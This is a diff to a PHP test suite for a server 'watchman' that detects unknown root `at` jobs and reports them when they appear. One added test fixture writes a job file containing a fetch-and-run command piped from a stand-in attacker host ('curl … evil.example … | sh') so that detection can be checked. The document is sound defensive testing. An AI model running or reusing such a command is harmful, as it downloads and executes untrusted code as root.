@@ -19936,8 +19936,8 @@ function testWatchmanAtUserScript(): void
     $r2 = watchmanRound($paths, $data, 1000, $now + 600, $docker, false, $acks);
     $book = watchmanLoad($data)['book'];
     $us1 = array_values(array_filter($book, fn ($e) => $e['kind'] === 'at_userscript'));
-    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is a card (told only days past its time)',
-        [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false, ['at_job' => 1], []],
+    same('at user script: one line, noted by itself, nothing to tell; the foreign job next to it is a card and told (1.82.0: the round it appears)',
+        [[], ['at_job'], 1, 'temporäre_rsyncs_4', 'auto', false, ['at_job' => 1], ['at_job']],
         [$r1['added'], $r2['added'], count($us1), $us1[0]['p']['name'] ?? null, $us1[0]['by'] ?? null, watchmanOpen($us1[0] ?? []),
          watchmanOpenCounts($book), array_column($r2['told'], 'kind')]);
     same('at user script: nothing for the team lead', ['at_job'], array_column(watchmanFindings($book), 'id'));
@@ -20350,8 +20350,8 @@ function testWatchmanAtOnce(): void
     $e = $lines(watchmanLoad($day)['book'], substr($job, 1))[0] ?? [];
     $page = array_values(array_filter(watchmanPageState($day, $t + 1, false)['book'], fn ($x) => $x['id'] === ($e['id'] ?? '')))[0] ?? [];
     $find = array_values(array_filter(watchmanFindings(watchmanLoad($day)['book']), fn ($f) => $f['id'] === 'at_job'))[0] ?? [];
-    same('at: a job he doesn\'t know — a line and a card saying what it is (queued when, by whom, what it starts), not told yet',
-        [['at_job'], [], true, false, 170, 'nobody', '/tmp/x.sh', '–', date('Y-m-d H:i', $t - 10), false, false],
+    same('at: a job he doesn\'t know — a line and a card saying what it is (queued when, by whom, what it starts), told that round (1.82.0)',
+        [['at_job'], ['at_job'], true, false, 170, 'nobody', '/tmp/x.sh', '–', date('Y-m-d H:i', $t - 10), true, false],
         [$r1['added'], array_column($r1['told'], 'kind'), watchmanOpen($e), $e['p']['run'] ?? null, $find['params']['num'] ?? null, $find['params']['user'] ?? null,
          $find['params']['prog'] ?? null, $find['params']['owner'] ?? null, $find['params']['queued'] ?? null, $page['tell'] ?? null, isset($e['important'])]);
     $later = [];
@@ -20360,7 +20360,8 @@ function testWatchmanAtOnce(): void
         $r = watchmanRound($paths, $day, $hired, $t + $dt, $docker, false, $acks);
         $later[] = [$r['added'], array_column($r['told'], 'kind')];
     }
-    same('at: past its time — nothing new; days past it still waiting — told (the same line)', [[[], []], [[], []], [[], ['at_job']]], $later);
+    same('at: past its time — nothing new, not told again; days past it still waiting — the same line, marked important (stuck), not told twice',
+        [[[], []], [[], []], [[], []], true], [...$later, !empty($lines(watchmanLoad($day)['book'], substr($job, 1))[0]['important'])]);
     rename("$src/atjobs/$job", "$src/atjobs/=" . substr($job, 1));
     touch($paths['atjobs'], $t + 3 * 86400 - 5);
     $r = watchmanRound($paths, $day, $hired, $t + 3 * 86400, $docker, false, $acks);
@@ -20388,6 +20389,80 @@ function testWatchmanAtOnce(): void
     $l = $lines(watchmanLoad($day)['book'], substr($job, 1));
     same('at: noted, it stays one closed line while it lives', [[], 1, false], [$again, count($l), watchmanOpen($l[0] ?? [])]);
 
+    putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
+    @unlink(watchmanLockFile($day, 'book'));
+    exec('rm -rf ' . escapeshellarg($tmp));
+}
+
+/**
+ * Code review 1.81.0, S6: a root `at` job the watchman doesn't know is told the round it appears — not only when it still
+ * waits two days past its time (1.72.0–1.81.0: a job queued for «now» or minutes ahead, the usual way to run something
+ * once as root, ran and left the queue untold; cron_file_foreign was told all along, so the two ways to schedule root work
+ * differed). Once per job number: the job running or gone the next round adds nothing; a second job is told again.
+ */
+function testWatchmanAtTold(): void
+{
+    $tmp = sys_get_temp_dir() . '/office-tests-attold-' . getmypid();
+    $src = "$tmp/src";
+    $day = "$tmp/data/watchman";
+    foreach (['crontabs', 'cron.d', 'logplugins', 'atjobs', 'agents', 'extra', 'ssh', 'flash/user.scripts/scripts', 'emhttp', 'proc/2', 'usrbin'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    @mkdir($day, 0700, true);
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/logplugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'etc_passwd' => "$src/passwd", 'crontabs' => "$src/crontabs", 'cron_d' => "$src/cron.d",
+              'cron_files' => "$src/flash", 'userscripts' => "$src/flash/user.scripts", 'atjobs' => "$src/atjobs", 'agents' => "$src/agents",
+              'emhttp_plugins' => "$src/emhttp", 'update_helper' => "$src/usrbin/plugin_update_helper", 'emhttpd' => "$src/proc"];
+    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\nnobody:x:99:100::/:/bin/false\n");
+    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp\n");
+    file_put_contents($paths['syslog'], '');
+    file_put_contents("$src/cron.d/root", "*/1 * * * * /usr/local/emhttp/plugins/dynamix/scripts/monitor &> /dev/null\n");
+    file_put_contents("$src/proc/2/comm", "emhttpd\n");
+    $head = fn (int $uid = 0) => "#!/bin/sh\n# atrun uid=$uid gid=0\n# mail root 0\numask 22\nPWD=/root; export PWD\nLOGNAME=root; export LOGNAME\nHOME=/root; export HOME\n"
+        . "USER=root; export USER\nSHLVL=2; export SHLVL\nPATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin; export PATH\ncd /root || {\n\t echo 'Execution directory inaccessible' >&2\n\t exit 1\n}\n";
+    $hired = 1793000000;
+    $t = $hired + 3600;
+    $docker = fn () => [];
+    $acks = "$tmp/acks.json";
+    $envBefore = getenv('OFFICE_NOTIFY_BIN');
+    putenv("OFFICE_NOTIFY_BIN=$tmp/no-notify");
+    $lines = fn (string $n) => array_values(array_filter(watchmanLoad($day)['book'], fn ($e) => watchmanAtOf($e) === $n));
+    // his first look: an empty queue, nothing to tell
+    touch($paths['atjobs'], $t - 5);
+    $r0 = watchmanRound($paths, $day, $hired, $t, $docker, false, $acks);
+    // `at now` as root: the job's file named by its minute, there when he looks the next round
+    $job = 'a000bb' . sprintf('%08x', intdiv($t + 240, 60));
+    file_put_contents("$src/atjobs/$job", $head() . "curl -s https://evil.example/x | sh\n");
+    touch("$src/atjobs/$job", $t + 290);
+    touch($paths['atjobs'], $t + 295);
+    $r1 = watchmanRound($paths, $day, $hired, $t + 300, $docker, false, $acks);
+    $e = $lines(substr($job, 1))[0] ?? [];
+    $find = array_values(array_filter(watchmanFindings(watchmanLoad($day)['book']), fn ($f) => $f['id'] === 'at_job'))[0] ?? [];
+    same('at told (S6): a root job queued for now - a line, the card, and told the round it appeared (sched, important)',
+        [[], [], ['at_job'], ['at_job'], true, true, 0, 'root', 'curl -s https://evil.example/… | sh', 'sched', true, true],     // the URL's path kept short, as always
+        [$r0['added'], array_column($r0['told'], 'kind'), $r1['added'], array_column($r1['told'], 'kind'), watchmanOpen($e), is_int($e['told'] ?? null), $e['p']['uid'] ?? null,
+         $find['params']['user'] ?? null, $e['p']['cmd'] ?? null, WATCH_KINDS['at_job'][0], WATCH_KINDS['at_job'][1], watchmanImportant($e)]);
+    // atd runs it and it leaves the queue: nothing more to tell, the one line stays (told once)
+    unlink("$src/atjobs/$job");
+    touch($paths['atjobs'], $t + 595);
+    $r2 = watchmanRound($paths, $day, $hired, $t + 600, $docker, false, $acks);
+    touch($paths['atjobs'], $t + 895);
+    $r3 = watchmanRound($paths, $day, $hired, $t + 900, $docker, false, $acks);
+    same('at told (S6): the job ran and left - told once, one line, nothing new the rounds after', [[], [], [], [], 1],
+        [$r2['added'], array_column($r2['told'], 'kind'), $r3['added'], array_column($r3['told'], 'kind'), count($lines(substr($job, 1)))]);
+    // a second unknown job, after the kind's quiet hour (WATCH_NOTIFY_QUIET: one notification per kind and hour, the next
+    // holds what came meanwhile): its own line, told again - once per job number
+    $job2 = 'a000bc' . sprintf('%08x', intdiv($t + 7500, 60));
+    file_put_contents("$src/atjobs/$job2", $head() . "/root/fix.sh\n");
+    touch("$src/atjobs/$job2", $t + 7190);
+    touch($paths['atjobs'], $t + 7195);
+    $r4 = watchmanRound($paths, $day, $hired, $t + 7200, $docker, false, $acks);
+    same('at told (S6): another unknown root job - told, once, its own line', [['at_job'], ['at_job'], 1, 1],
+        [$r4['added'], array_column($r4['told'], 'kind'), count($lines(substr($job2, 1))), count($lines(substr($job, 1)))]);
+    $src2 = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php');
+    check('at told (S6): the kind is told like cron_file_foreign; a job stuck days past its time is marked important, not told anew',
+        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= WATCH_AT_LATE;')
+        && str_contains((string) file_get_contents(OFFICE_DIR . '/docs/GUIDE.md'), 'goes to the notifications once, when it appears'));
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($day, 'book'));
     exec('rm -rf ' . escapeshellarg($tmp));
